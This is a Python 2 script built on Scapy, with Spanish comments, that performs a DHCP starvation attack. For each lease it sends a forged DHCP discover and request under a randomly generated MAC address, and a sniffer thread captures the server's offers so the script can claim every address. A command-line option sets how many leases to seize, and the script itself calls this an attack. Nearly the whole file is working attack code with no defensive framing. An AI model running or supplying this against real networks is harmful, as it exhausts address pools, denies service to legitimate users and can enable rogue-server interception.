#!/usr/bin/env python

import random
import time
import threading
import sys

from scapy.sendrecv import sendp, sniff
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.layers.inet import UDP
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.arch import get_if_hwaddr, conf

# Global settings
local_mac = get_if_hwaddr(conf.iface)
ip_offered = ''
dhcp_option_54 = ''
max_packets = 0

def format(mac_address):
    limiter = 1
    mac = ""
    for i in mac_address:
        mac = mac + i
        if limiter%2 == 0 and limiter < 11:
            mac = mac + ":"
        limiter+=1
    return mac  

def discover_dhcp( _mac , _id ):
    packet_discovery = Ether(
                src=local_mac,
                dst='ff:ff:ff:ff:ff:ff')/IP(
                src='0.0.0.0', dst='255.255.255.255')/UDP(sport=2001,dport=67)/BOOTP(
                    chaddr=_mac.decode('hex'),xid=_id)/DHCP(
                    options=[('message-type', 'discover'), 'end'])
    sendp(packet_discovery, verbose=False)

def request_dhcp( _mac, _id ):
    packet_request = Ether(
                src=local_mac,
                dst='ff:ff:ff:ff:ff:ff')/IP(
                src='0.0.0.0', dst='255.255.255.255')/UDP(sport=2001,dport=67)/BOOTP(
                    chaddr=_mac.decode('hex'),xid=_id)/DHCP(
                    options=[   ('message-type', 'request'), 
                                ('requested_addr', ip_offered),
                                ('server_id', dhcp_option_54), 'end'])
    sendp(packet_request, verbose=False)

def generateRandMac():
    mac = ''
    parHex = ['0','2','4','6','8','a','c','e']
    for i in range(0, 10):
        rand_val = random.randint(0,15)
        mac = mac + hex(rand_val).split("x")[1]
    return hex(random.randint(0,15)).split("x")[1] + parHex[random.randint(0,7)] + mac

def processPacket(packet):
    if DHCP in packet and packet[DHCP].options[0][1] == 2:
        global ip_offered, dhcp_option_54
        ip_offered = packet[BOOTP].yiaddr
        dhcp_option_54 = packet[IP].src
    elif DHCP in packet and packet[DHCP].options[0][1] == 5:
        if ip_offered == packet[BOOTP].yiaddr:
            print 'ip ', ip_offered, ' adquirida'

def listenDHCP():
    sniff(filter="udp and port 68", prn=processPacket, count=max_packets)

def main():

    # Capturamos el trafico que provenga del servidor dhcp
    global max_packets
    max_packets = 2 if len(sys.argv) == 1 else 2*int(sys.argv[2])

    listen_thread = threading.Thread(target=listenDHCP)

    listen_thread.start()

    # Damos tiempo para el sniffer este listo
    time.sleep(3)

    print 'Usando la MAC:',local_mac,' para el ataque'

    if len(sys.argv) > 2:
        if sys.argv[1] == "-n":
            for i in range(0, int(sys.argv[2]) ):
                # Generamos el id y la mac de la transaccion
                _id = random.randint(0,1e9)
                _mac = generateRandMac()
                # Identificador de transaccion
                print 'id',hex(_id),'\tMAC:',format(_mac),'=>',
                # Lanzamos el discover
                discover_dhcp( _mac, _id )
                # Damos tiempo para que se actualizen las variables globales
                time.sleep(3)
                # Lanzamos el request
                request_dhcp( _mac, _id )
                # Si se logro obtener un ack guaradmos la ip y procedemos con el ataque
                time.sleep(3)
        else:
            print 'usage ./dhcp.py [ -n <0-65536> ]'
    else:
        # Generamos el id de la transaccion y la mac
        _id = random.randint(0,1e9)
        _mac = generateRandMac()
        # Identificador de transaccion
        print 'id '+hex(_id)+'\tMAC:'+format(_mac)+' => ',
        # Lanzamos el discover
        discover_dhcp( _mac, _id )
        # Damos tiempo para que se actualizen las variables globales
        time.sleep(3)
        # Lanzamos el request
        request_dhcp( _mac, _id )
	
    listen_thread.join()
            
main()
